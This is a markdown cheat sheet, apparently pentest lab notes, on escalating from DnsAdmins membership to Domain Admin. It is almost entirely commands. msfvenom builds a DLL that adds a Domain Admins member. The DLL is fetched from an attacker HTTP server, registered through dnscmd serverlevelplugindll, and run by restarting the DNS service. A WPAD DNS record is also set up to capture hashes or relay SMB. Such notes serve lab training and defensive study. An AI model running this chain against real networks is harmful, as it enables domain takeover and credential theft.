# DnsAdmins → SYSTEM/Domain Admin

**Concept:** Members of `DnsAdmins` can configure the DNS service. Since DNS runs as `NT AUTHORITY\SYSTEM`, we can make it load a malicious DLL and execute code with SYSTEM privileges.

---

## 1. Generate Malicious DLL (Kali)

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

**Why:** Creates a DLL that, when loaded by SYSTEM, executes our command (here: add a user to Domain Admins).

---

## 2. Host DLL on Attacker Machine

```bash
python3 -m http.server 7777
```

**Why:** Makes the DLL accessible for download to the target Windows machine.

---

## 3. Download DLL to Target

```powershell
wget "http://10.10.15.56:7777/adduser.dll" -outfile "adduser.dll"
```

**Why:** We need the malicious DLL stored locally on the target so DNS service can load it.

---

## 4. Confirm DnsAdmins Membership

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

**Why:** Only members of `DnsAdmins` can configure the DNS plugin DLL path.

---

## 5. Load Custom DLL

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

**Why:** Sets the registry key `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll` to point to our DLL. DNS loads it on next start.

> **Must use full path.**

---

## 6. Check DNS Service Permissions

```cmd
wmic useraccount where name="netadm" get sid
sc.exe sdshow DNS
```

**Why:** We need to know if our user can stop/start the DNS service. Look for `RPWP` on our SID → `SERVICE_START` + `SERVICE_STOP`.

---

## 7. Restart DNS Service (Triggers DLL)

```cmd
sc.exe stop dns
sc.exe start dns
```

**Why:** Stopping and starting DNS forces it to load the configured malicious DLL as SYSTEM, executing our payload.

---

## 8. Verify Domain Admin Access

```cmd
net group "Domain Admins" /dom
```

**Why:** Confirms our command executed with SYSTEM and our user was added to Domain Admins.

---

## Cleanup (Requires Admin)

### Confirm Registry Key

```cmd
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```

**Why:** Verify the malicious plugin path is still there before removing it.

### Delete Registry Key

```cmd
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

**Why:** Removes the malicious DLL reference so DNS can start normally again.

### Restart DNS

```cmd
sc.exe start dns
sc query dns
```

**Why:** Confirms DNS is back to a healthy running state after cleanup.

---

## Alternate Attack: WPAD Record Abuse

> Members of `DnsAdmins` can disable the global query block list and add a WPAD DNS record, redirecting traffic through attacker machine.

### Disable Global Query Block List

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**Why:** By default, WPAD queries are blocked. This allows us to create a usable WPAD record.

### Add WPAD Record

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

**Why:** Points clients to our attacker IP so we can capture hashes with `Responder`/`Inveigh` or perform SMBRelay.

---

## Quick Recall

1. **Make DLL** → hosts it on attacker machine → download to target.
2. **Load DLL** with `dnscmd.exe /config /serverlevelplugindll <full_path>`.
3. **Restart DNS** with `sc stop dns` → `sc start dns` to trigger SYSTEM execution.
4. **Verify** with `net group "Domain Admins" /dom`.
5. **Cleanup** by deleting `ServerLevelPluginDll` registry value and restarting DNS.
